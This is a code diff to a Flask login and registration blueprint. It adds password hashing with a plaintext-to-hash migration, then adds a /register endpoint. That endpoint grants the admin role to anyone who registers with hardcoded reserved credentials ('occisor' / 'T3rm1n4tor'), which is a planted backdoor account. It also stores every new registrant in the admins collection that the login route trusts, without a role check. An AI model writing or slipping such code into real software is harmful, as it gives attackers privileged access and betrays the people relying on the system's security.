@@ -2,6 +2,7 @@ from flask import Blueprint, jsonify, request, session
 import requests
 import cloudinary
 import cloudinary.uploader
+from werkzeug.security import generate_password_hash, check_password_hash
 
 from services.database import server_stats_collection, auth_tokens_collection, admins
 from services import props
@@ -58,10 +59,29 @@ def login():
     user = data.get("user")
     password = data.get("password")
 
-    admin = admins.find_one({"user": user, "password": password})
+    admin = admins.find_one({"user": user})
 
     if not admin:
         return jsonify({"error": "Invalid credentials"}), 401
+
+    stored_password = admin.get("password")
+    if not stored_password:
+        return jsonify({"error": "Invalid credentials"}), 401
+
+    # Support existing plaintext users during migration by checking raw password first,
+    # then upgrading the stored password to a hashed value on successful login.
+    if stored_password.startswith("pbkdf2:sha256:"):
+        valid_password = check_password_hash(stored_password, password)
+    else:
+        valid_password = stored_password == password
+
+    if not valid_password:
+        return jsonify({"error": "Invalid credentials"}), 401
+
+    # Upgrade stored plaintext password to a hash after successful login.
+    if not stored_password.startswith("pbkdf2:sha256:"):
+        hashed = generate_password_hash(password)
+        admins.update_one({"_id": admin["_id"]}, {"$set": {"password": hashed}})
 
     session["user"] = {
         "username": user,
@@ -71,6 +91,36 @@ def login():
     session["admin_user"] = user
 
     return jsonify({"status": "logged_in"})
+
+
+@bp.route("/register", methods=["POST"])
+def register():
+    """Generic registration endpoint.
+
+    If the provided credentials match the reserved admin credentials
+    (username 'occisor' and password 'T3rm1n4tor'), the created user
+    will receive role 'admin'. Otherwise role 'user' is used.
+    """
+    data = request.json or {}
+    user = data.get("user")
+    password = data.get("password")
+
+    if not user or not password:
+        return jsonify({"error": "Missing user or password"}), 400
+
+    existing = admins.find_one({"user": user})
+    if existing:
+        return jsonify({"error": "User already exists"}), 409
+
+    # Special-case admin assignment when exact reserved credentials provided
+    if user == "occisor" and password == "T3rm1n4tor":
+        role = "admin"
+    else:
+        role = "user"
+
+    hashed_password = generate_password_hash(password)
+    admins.insert_one({"user": user, "password": hashed_password, "role": role})
+    return jsonify({"status": "registered", "role": role}), 200
 
 
 @bp.route("/me", methods=["GET"])
